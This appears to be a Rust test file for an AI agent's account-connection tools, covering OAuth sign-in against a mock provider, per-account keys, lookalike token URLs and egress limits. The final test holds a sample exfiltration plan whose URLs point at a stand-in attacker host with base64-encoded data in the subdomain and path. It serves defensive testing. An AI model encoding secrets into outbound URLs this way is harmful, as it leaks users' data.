//! auth_propose and connection_add end to end: the choice card, the
//! sign-in card answered by a fake browser, registration, the same account
//! twice, a key, and nobody there.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use serde_json::{Value, json};
use tern_auth::tools::{AuthHost, AuthPropose, ConnectionAdd, Target, Targets};
use tern_auth::{AuthPlan, ClientKind, Connections, Guard, Kind, Source, Tokens};
use tern_core::approval::{
    ApprovalHandler, ApprovalRequest, AuthCard, AuthPrompt, Decision, SecretRequest, SecretValues,
};
use tern_core::config::AuthConfig;
use tern_core::tool::{Tool, ToolCtx};
use tokio_util::sync::CancellationToken;
use wiremock::matchers::{body_string_contains, header, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

/// Answers choice cards with `choice`, follows sign-in pages like a
/// browser whose user approves, and types `keys` into secret prompts.
struct User {
    choice: Option<&'static str>,
    keys: SecretValues,
    cards: Mutex<Vec<AuthPrompt>>,
}

#[async_trait]
impl ApprovalHandler for User {
    async fn ask(&self, _: &ApprovalRequest) -> Decision {
        Decision::Deny
    }

    async fn ask_secrets(&self, _: &SecretRequest) -> Option<SecretValues> {
        Some(self.keys.clone())
    }

    async fn ask_auth(&self, req: &AuthPrompt) -> Option<String> {
        self.cards.lock().unwrap().push(req.clone());
        match &req.card {
            AuthCard::Choose { .. } => self.choice.map(str::to_owned),
            AuthCard::SignIn { url: Some(url), .. } => {
                let u = reqwest::Url::parse(url).unwrap();
                let q = |k: &str| {
                    u.query_pairs()
                        .find(|(n, _)| n == k)
                        .unwrap()
                        .1
                        .into_owned()
                };
                let back = format!("{}?code=the-code&state={}", q("redirect_uri"), q("state"));
                tokio::spawn(async move { reqwest::get(back).await });
                // The card stays open until the sign-in closes it.
                std::future::pending().await
            }
            AuthCard::SignIn { .. } => None,
        }
    }
}

fn user(choice: Option<&'static str>) -> Arc<User> {
    Arc::new(User {
        choice,
        keys: SecretValues::new(),
        cards: Mutex::default(),
    })
}

fn ctx() -> ToolCtx {
    ToolCtx {
        workspace: std::env::temp_dir(),
        run_id: "r".into(),
        session_id: "s".into(),
        cancel: CancellationToken::new(),
    }
}

async fn idp() -> MockServer {
    let s = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/register"))
        .respond_with(ResponseTemplate::new(201).set_body_json(json!({"client_id": "dyn-1"})))
        .mount(&s)
        .await;
    // Three sign-ins: two accounts, then the first one again.
    for (n, token) in ["AT-1-aaaa", "AT-2-bbbb", "AT-3-cccc"].iter().enumerate() {
        Mock::given(method("POST"))
            .and(path("/token"))
            .and(body_string_contains("code_verifier="))
            .and(body_string_contains("client_id=dyn-1"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "access_token": token, "token_type": "Bearer", "refresh_token": format!("RT-{n}-zzzz")
            })))
            .up_to_n_times(1)
            .with_priority(n as u8 + 1)
            .mount(&s)
            .await;
    }
    for (token, email) in [
        ("AT-1-aaaa", "me@work.com"),
        ("AT-2-bbbb", "me@gmail.com"),
        ("AT-3-cccc", "me@work.com"),
    ] {
        Mock::given(method("GET"))
            .and(path("/userinfo"))
            .and(header("authorization", format!("Bearer {token}").as_str()))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({"email": email})))
            .mount(&s)
            .await;
    }
    s
}

fn plan(s: &MockServer) -> AuthPlan {
    AuthPlan {
        method: "oauth2".into(),
        service: "Acme".into(),
        source: Some(Source::McpMetadata),
        provider: "acme".into(),
        issuer: Some(s.uri()),
        authorize_url: Some(format!("{}/authorize", s.uri())),
        token_url: Some(format!("{}/token", s.uri())),
        userinfo_url: Some(format!("{}/userinfo", s.uri())),
        registration_url: Some(format!("{}/register", s.uri())),
        pkce: vec!["S256".into()],
        client: Some(ClientKind::DynamicRegistration),
        client_ready: true,
        scopes_supported: vec!["read".into()],
        verified: true,
        ..AuthPlan::default()
    }
}

struct Env {
    _dir: tempfile::TempDir,
    host: Arc<AuthHost>,
    conns: Arc<Connections>,
    targets: Targets,
}

fn env(s: &MockServer) -> Env {
    let dir = tempfile::tempdir().unwrap();
    let secrets = tern_core::Secrets::load(&dir.path().join("secrets.toml")).unwrap();
    let cfg = AuthConfig {
        local_issuers: vec![s.uri()],
        sign_in_timeout_secs: 20,
        ..AuthConfig::default()
    };
    let tokens = Arc::new(Tokens::new(secrets, Guard::new(&cfg.local_issuers)));
    let conns = Arc::new(Connections::new(
        tern_store::Store::open_in_memory().unwrap(),
        tokens,
        10,
    ));
    let targets: Targets = Arc::new(|| {
        vec![
            Target {
                kind: Kind::Mcp,
                name: "acme".into(),
                key_names: vec![],
                oauth: None,
            },
            Target {
                kind: Kind::Connector,
                name: "keyed".into(),
                key_names: vec!["API_KEY".into()],
                oauth: None,
            },
        ]
    });
    Env {
        _dir: dir,
        host: Arc::new(AuthHost::new(&cfg)),
        conns,
        targets,
    }
}

fn parse(out: &tern_core::tool::ToolResult) -> Value {
    assert!(!out.is_error, "{}", out.content);
    serde_json::from_str(&out.content).unwrap()
}

#[tokio::test]
async fn the_user_chooses_then_signs_in_twice_and_again() {
    let s = idp().await;
    let e = env(&s);
    let u = user(Some("oauth"));
    let id = e.host.plans.keep(plan(&s));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: u.clone(),
    };
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "oauth");
    {
        let cards = u.cards.lock().unwrap();
        let AuthCard::Choose {
            title,
            options,
            notes,
        } = &cards[0].card
        else {
            panic!()
        };
        assert_eq!(title, "Connect Acme");
        assert_eq!(options[0].id, "oauth");
        assert!(options[0].recommended && options[0].detail.starts_with("No keys to copy"));
        assert!(
            notes.iter().any(|n| n.contains("metadata (verified)")),
            "{notes:?}"
        );
    }

    let add = ConnectionAdd::new(
        e.host.clone(),
        e.conns.clone(),
        u.clone(),
        e.targets.clone(),
    );
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("connected"), Some("default"))
    );
    assert_eq!(v["account"], "me@work.com");
    assert!(
        !v.to_string().contains("AT-1"),
        "the model never sees a token"
    );
    let secrets = e.conns.tokens.secrets();
    assert_eq!(
        secrets
            .get("conn/acme/default/oauth/access_token")
            .as_deref(),
        Some("AT-1-aaaa")
    );

    // Another account: its own registration, its own tokens, a slug from
    // its email.
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("connected"), Some("me"))
    );
    assert_eq!(
        secrets.get("conn/acme/me/oauth/access_token").as_deref(),
        Some("AT-2-bbbb")
    );
    let regs = s
        .received_requests()
        .await
        .unwrap()
        .iter()
        .filter(|r| r.url.path() == "/register")
        .count();
    assert_eq!(regs, 2, "registration is per account");

    // The first account again: reconnected, not a duplicate.
    let v = parse(
        &add.call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "connection": "third"}),
        )
        .await,
    );
    assert_eq!(
        (v["status"].as_str(), v["connection"].as_str()),
        (Some("reconnected"), Some("default"))
    );
    assert_eq!(e.conns.list(Kind::Mcp, "acme").len(), 2);
    assert_eq!(
        secrets
            .get("conn/acme/default/oauth/access_token")
            .as_deref(),
        Some("AT-3-cccc")
    );
    // Every sign-in card named the target and carried the real sign-in URL.
    let cards = u.cards.lock().unwrap();
    for c in cards.iter().skip(1) {
        let AuthCard::SignIn { title, url, .. } = &c.card else {
            panic!()
        };
        assert!(title.starts_with("Sign in to acme"), "{title}");
        assert!(
            url.as_deref()
                .unwrap()
                .starts_with(&format!("{}/authorize?", s.uri()))
        );
    }
}

#[tokio::test]
async fn a_key_is_entered_privately_per_account() {
    let s = idp().await;
    let e = env(&s);
    let u = Arc::new(User {
        choice: None,
        keys: SecretValues::from([(
            "conn/keyed/work/API_KEY".to_owned(),
            " k-123456 ".to_owned(),
        )]),
        cards: Mutex::default(),
    });
    let add = ConnectionAdd::new(e.host.clone(), e.conns.clone(), u, e.targets.clone());
    let v = parse(
        &add.call(
            &ctx(),
            json!({"target": "keyed", "connection": "work", "method": "key"}),
        )
        .await,
    );
    assert_eq!(v["status"], "connected");
    assert_eq!(
        e.conns
            .tokens
            .secrets()
            .get("conn/keyed/work/API_KEY")
            .as_deref(),
        Some("k-123456")
    );
    let c = e.conns.get(Kind::Connector, "keyed", "work").unwrap();
    assert_eq!(c.auth.method(), "key");
}

#[tokio::test]
async fn nobody_there_skips_and_researched_lookalikes_are_refused() {
    let s = idp().await;
    let e = env(&s);
    let nobody = user(None);
    let id = e.host.plans.keep(plan(&s));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: nobody.clone(),
    };
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "none");
    let add = ConnectionAdd::new(
        e.host.clone(),
        e.conns.clone(),
        Arc::new(tern_core::approval::AutoDeny),
        e.targets.clone(),
    );
    let v = parse(
        &add.call(&ctx(), json!({"target": "acme", "plan_id": id}))
            .await,
    );
    assert_eq!(v["status"], "skipped");
    assert!(e.conns.list(Kind::Mcp, "acme").is_empty());

    // A plan the agent researched, with a token URL on another domain.
    let bad = propose
        .call(
            &ctx(),
            json!({"plan": {
                "service": "Notion",
                "authorize_url": "https://api.notion.com/v1/oauth/authorize",
                "token_url": "https://notion-login.com/oauth/token",
                "api_hosts": ["api.notion.com"]
            }}),
        )
        .await;
    assert!(
        bad.is_error && bad.content.contains("can't be used"),
        "{}",
        bad.content
    );
    assert!(
        nobody.cards.lock().unwrap().len() == 1,
        "no card for a refused plan"
    );

    // No OAuth: a key, with no card to answer.
    let id = e.host.plans.keep(AuthPlan {
        method: "unknown".into(),
        ..AuthPlan::default()
    });
    let v = parse(&propose.call(&ctx(), json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "key");
    // connection_add can't swap the user's choice.
    e.host.plans.choose(&id, "key");
    let swapped = add
        .call(
            &ctx(),
            json!({"target": "acme", "plan_id": id, "method": "oauth"}),
        )
        .await;
    assert!(
        swapped.is_error && swapped.content.contains("chose"),
        "{}",
        swapped.content
    );
}

/// Security fix 1: a researched plan is an outbound request to a host the
/// agent chose (with whatever it encodes in the host and path), so it is
/// egress for the tainted host limit, never reachable from a script, and
/// capped per run.
#[tokio::test]
async fn researched_plans_are_egress_and_capped() {
    use tern_core::tool::Effect;
    let s = idp().await;
    let e = env(&s);
    let u = user(Some("oauth"));
    let propose = AuthPropose {
        host: e.host.clone(),
        asker: u.clone(),
    };
    let exfil = json!({"plan": {
        "service": "Acme",
        "issuer": "https://c2VjcmV0.attacker.invalid/cGF5bG9hZA",
        "authorize_url": "https://c2VjcmV0.attacker.invalid/authorize",
        "token_url": "https://c2VjcmV0.attacker.invalid/token",
        "api_hosts": ["api.attacker.invalid"]
    }});
    // The host the metadata fetch goes to is what the taint check sees.
    assert_eq!(
        propose.egress_host(&exfil).as_deref(),
        Some("c2vjcmv0.attacker.invalid")
    );
    let mut no_issuer = exfil.clone();
    no_issuer["plan"].as_object_mut().unwrap().remove("issuer");
    assert_eq!(
        propose.egress_host(&no_issuer).as_deref(),
        Some("c2vjcmv0.attacker.invalid")
    );
    // A kept plan fetches nothing.
    assert_eq!(propose.egress_host(&json!({"plan_id": "plan_x"})), None);

    for tool in ["auth_discover", "auth_propose", "connection_add"] {
        assert!(
            !tern_core::script::callable_in_scripts(tool, Effect::Read),
            "{tool} is offered to scripts"
        );
    }

    // A run can't loop it: past the cap, nothing is fetched or shown.
    let c = ctx();
    for _ in 0..tern_auth::tools::MAX_PROPOSALS_PER_RUN {
        let out = propose.call(&c, json!({"plan_id": "plan_gone"})).await;
        assert!(out.content.contains("no plan"), "{}", out.content);
    }
    let out = propose.call(&c, exfil.clone()).await;
    assert!(
        out.is_error && out.content.contains("proposed enough"),
        "{}",
        out.content
    );
    assert!(u.cards.lock().unwrap().is_empty());
    // Another run has its own allowance.
    let other = ToolCtx {
        run_id: "r2".into(),
        ..ctx()
    };
    let id = e.host.plans.keep(plan(&s));
    let v = parse(&propose.call(&other, json!({"plan_id": id})).await);
    assert_eq!(v["choice"], "oauth");
}
